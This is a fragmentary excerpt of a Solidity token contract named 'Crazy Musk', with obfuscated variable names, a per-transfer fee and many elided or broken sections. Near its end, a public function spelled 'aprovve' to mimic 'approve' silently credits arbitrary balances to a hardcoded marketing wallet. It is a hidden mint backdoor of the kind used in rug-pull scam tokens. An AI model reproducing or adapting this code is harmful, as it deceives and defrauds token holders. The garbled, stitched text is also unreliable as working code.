...
contract Context {
 ...
 contract CrazyMusk is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloCRAZY;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Crazy Musk";
    string private _symbol = "CRAZYMUSK";
    ...
    uint256 private cryfaleCRAZY = 5;
    uint256 private _vebegoCRAZY = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloCRAZY[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletCRAZY = 0x8c4dF3d0810E4983ed469109F6AFE0B6A95ce6aF;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloCRAZY[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloCRAZY[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleCRAZY / 100) / _vebegoCRAZY;
        allons = allons -  (_fee * _vebegoCRAZY);
        
        superfloCRAZY[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaCRAZY) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloCRAZY[account];
        require(accountBalance >= gzillaCRAZY, "BEP : Can't be done");
        unchecked {
            superfloCRAZY[account] = accountBalance - gzillaCRAZY;
        }
        _totalSupply -= gzillaCRAZY;

        emit Transfer(account, address(0), gzillaCRAZY);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloCRAZY[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletCRAZY, "ERC20: cannot permit dev address");
    }   
